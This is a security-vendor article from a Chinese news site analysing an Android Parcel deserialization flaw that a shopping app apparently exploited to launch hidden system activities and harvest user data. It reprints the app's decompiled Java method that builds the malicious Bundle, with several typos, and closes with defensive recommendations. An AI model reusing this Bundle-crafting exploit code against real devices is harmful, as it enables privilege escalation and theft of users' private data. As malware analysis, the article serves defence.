---
title: App恶意提权，可随意窃取用户信息！！
url: https://www.4hou.com/posts/q8P2
source: 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com
date: 2023-03-15
fetch_date: 2025-10-04T09:34:38.667139
---

# App恶意提权，可随意窃取用户信息！！

App恶意提权，可随意窃取用户信息！！ - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# App恶意提权，可随意窃取用户信息！！

海云安Secidea
[行业](https://www.4hou.com/category/industry)
2023-03-14 15:37:28

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)111860

收藏

导语：海云安深耕移动应用安全领域多年，在App漏洞挖掘、分析、验证和利用等方面积累了大量的实践经验，已形成较为完善的漏洞全流程管理体系，且荣获多项荣誉。目前海云安是工业和信息化部移动互联网APP产品安全漏洞库（CAPPVD）、国家信息安全漏洞库（CNNVD）、信创政务产品安全漏洞库（CITIVD）等漏洞库重要技术支撑单位，并且每月都会向各平台报送一定数量的漏洞情报；2022年底，海云安“移动应用风险评估

3月初有关于利用Android漏洞在发布的移动应用中植入恶意程序代码获取用户敏感信息和数据这一恶劣事件，严重危害用户隐私权益。

![11.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230314/1678779286195855.png "1678779080401309.png")

我司技术人员对该问题进行分析和研究如下：

**漏洞成因**

和Java反序列化漏洞一样，Android的序列化和反序列化也会被利用，由于在序列化阶段存储的Key-Value，这导致在读取阶段如果数据没有被准确校验就会被构造的数据在反序列化阶段被利用。根据

https://xz.aliyun.com/t/2364#LaunchAnyWhere文章的分析，可以知道在反序列化阶段的时候如果构造的Bundle对象中存储的是{intent:myIntent}，会被传递给系统应用Settings，最终会被调用startActivity(intent)，如此就能实现任意App启动未导出等activity。

相比于传统的Java的序列化实现接口Serializable不同，Android的序列化实现的接口是Parcelable对象，这个接口用于在Android的通信Intent或者Binder进行传输数据。Android的序列化对象需要通过Bundle来携带，传输是需要使用Key-Value的方式存储，其内部的实现是一个Map，在获取数据时根据Key来取出对应的数值。

![12.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230314/1678779286153955.png "1678779116107697.png")

![13.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230314/1678779287651852.png "1678779130135039.png")

读取的时候通过对应的Type来读取

![14.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230314/1678779288125737.png "1678779149142999.png")

这样就能通过序列化传输和反序列化来读取完成数据传递。

App分析

从上面的分析可以知道，对PDD分析是可以看到如下

![15.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230314/1678779289497001.png "1678779169835993.png")

程序在构造Bundle对象并通过startSpecialActivity等函数进行分发启动。这其中还通过实现Autheniticator来构造恶意的Bundle对象

![16.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230314/1678779289194650.png "1678779196739694.png")

为了逃避静态分析，程序内使用了动态解密字符串和反射调用等方式构造调用链并在调用阶段通过配置文件来动态下发指令方式执行

![17.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230314/1678779290200654.png "1678779221845192.png")

![18.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230314/1678779291134473.png "1678779230134304.png")

结合文章：

https://github.com/davinci1010/pinduoduo\_backdoor

![19.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230314/1678779292267419.png "1678779246101201.png")

//  assets/component/com.xunmeng.pinduoduo.AliveBaseAbilitiy

//  [Manwei]

//  com/xunmeng/pinduoduo/android\_pull\_ablity\_comp/pullstartup/SamsungAlivePullStartup

Public  static Bundle makeBundleForSamsungSinceP(Intent intent){

   Bundle bundle = new Bundle();

   Parcel obtain = Parcel.obtain();

   Parcel obtain2 = Parcel.obtain();

   Parcel obtain3 = Parcel.obtain();

   obtain2.writeInt(3);

   obtain2.writeInt(13);

   obtain2.writeInt(72);

   obtain2.writeInt(3);

   obtain2.writeInt(0);

   obtain2.writeInt(0);

   obtain2.writeInt(0);

   obtain2.writeInt(0);

   obtain2.writeInt(0);

   obtain2.writeInt(4);

    obtain2.writeString("com.samsung.android.cepproxyks.CertByte");

   obtain2.writeInt(0);

   byte b[] = new byte[0];

   obtain2.writeByteArray(b);

   obtain2.writeInt(0);

   obtain2.writeInt(13);

   obtain2.writeInt(72);

   obtain2.writeInt(53);

   obtain2.writeInt(0);

   obtain2.writeInt(0);

   obtain2.writeInt(0);

   obtain2.writeInt(0);

   obtain2.writeInt(0);

   obtain2.writeInt(1);

   obtain2.writeInt(1);

   obtain2.writeInt(13);

   obtain2.writeInt(72);

   obtain2.writeInt(48);

   obtain2.writeInt(0);

   obtain2.writeInt(0);

   obtain2.writeInt(0);

   obtain2.writeInt(0);

   obtain2.writeInt(0);

   obtain2.writeInt(13);

   obtain2.writeInt(-1);

   int dataPosition = obtain2.dataPosition();

   obtain2.writeString("intent");

   obtain2.writeInt(4);

    obtain2.writeString("android.content.Intent");

   obtain2.writeToParcel(obtain3, 0);

   obtain2.appendFrom(obtain3, 0,  obtain3.dataSize());

   int dataPosition2 =  obtain2.dataPosition();

   obtain2.setDataPosition(dataPosition2 -  4);

   obtain2.writeInit(dataPosition2  -dataPosition);

   obtain2.setdataPosition(dataPosition2);

   int dataSize = obtain2.dataSize();

   obtain.writeInt(dataSize);

   obtain.writeInt(1279544898);

   obtain.appendFrom(obtain2, 0, dataSize);

   obtain.setDataPosition(0);

   bundle.readFromParcel(obtain);

   return bundle;

}

# **漏洞影响范围**

目前除了google更新的Android13对该漏洞修复外，可能有些厂商的手机并未修复此漏洞。

# **相关建议**

1.APP产品提供者安全开发上线进行源代码扫描，避免出现已知漏洞；

2.手机厂商需要更重视自研代码的安全，削减不必要的、可能被攻击者利用的攻击面；

3.监管机构需要针对此类行为进行治理，根据现有法律法规严格执法、监管，严肃问责，以推进、构建一个更安全的数字环境；

4.手机用户及时升级系统版本，使用主流厂商手机

如若转载，请注明原文地址

* 分享至

![取消](https://www.4hou.com/sihou/images/close.jpg)
![嘶吼](https://www.4hou.com/sihou/images/logo.png)

感谢您的支持，我会继续努力的!

![扫码支持]( "扫一扫")

打开微信扫一扫后点击右上角即可分享哟

### 发表评论

评论

![](https://www.4hou.com/captcha/flat?kxdqlb75)

#### 你可能感兴趣的

* [![]()

  Exchange/M365最新防范攻略！CACTER三步补齐原生防护短板](https://www.4hou.com/posts/l03l)
* [![]()

  【附下载】2025我们身边的 网信安全 典型案例等 官方视频汇编](https://www.4hou.com/posts/kg3x)
* [![]()

  蝉联荣誉！梆梆安全再度获选 “北京市委网信办第二届网络安全技术支撑单位”](https://www.4hou.com/posts/9jKP)
* [![]()

  聚焦可信AI安全！SDC2025 议题重磅揭晓](https://www.4hou.com/posts/gy39)
* [![]()

  2025第五届太原网络安全高峰论坛成功举办](https://www.4hou.com/posts/8gJl)
* [![]()

  特勤局手册 | 监听办公室](https://www.4hou.com/posts/42B2)

![](https://img.4hou.com/portraits/7a95d96923fd2548e32436d0da7797ca.png)

# [海云安Secidea](https://www.4hou.com/member/VWOW)

这个家伙很懒,什么也没说!

#### 最新文章

* [Exchange/M365最新防范攻略！CACTER三步补齐原生防护短板](https://www.4hou.com/posts/l03l)
  2025-09-29 17:48:04
* [【附下载】2025我们身边的 网信安全 典型案例等 官方视频汇编](https://www.4hou.com/posts/kg3x)
  2025-09-29 14:55:37
* [蝉联荣誉！梆梆安全再度获选 “北京市委网信办第二届网络安全技术支撑单位”](https://www.4hou.com/posts/9jKP)
  2025-09-29 14:23:50
* [聚焦可信AI安全！SDC2025 议题重磅揭晓](https://www.4hou.com/posts/gy39)
  2025-09-28 17:20:40

[查看更多](https://www.4hou.com/member/VWOW)

# 相关热文

* [Exchange/M365最新防范攻略！CACTER三步补齐原生防护短板](https://www.4hou.com/posts/l03l)

  CACTER
* [【附下载】2025我们身边的 网信安全 典型案例等 官方视频汇编](https://www.4hou.com/posts/kg3x)

  网络伍豪
* [蝉联荣誉！梆梆安全再度获选 “北京市委网信办第二届网络安全技术支撑单位”](https://www.4hou.com/posts/9jKP)

  梆梆安全
* [聚焦可信AI安全！SDC2025 议题重磅揭晓](https://www.4hou.com/posts/gy39)

  企业资讯
* [2025第五届太原网络安全高峰论坛成功举办](https://www.4hou.com/posts/8gJl)

  企业资讯
* [特勤局手册 | 监听办公室](https://www.4hou.com/posts/42B2)

  RC2反窃密实验室

![]()

[公司简介](https://www.4hou.com/about?title=公司简介)
|
[我要投稿](https://www.4hou.com/about?title=我要投稿)
|
[更新日志](https://www.4hou.com/about?title=更新日志)
|
[友情链接](https://www.4hou.com/about?title=友情链接)
|
[隐私政策](https://www.4hou.com/about?title=隐私政策)
|

[![](https://www.4hou.com/sihou/images/new4hou/weibo.png)](http://weibo.com/u/6069423878)
![](https://www.4hou.com/sihou/images/new4hou/wechat.png)

本站4hou.com，所使用...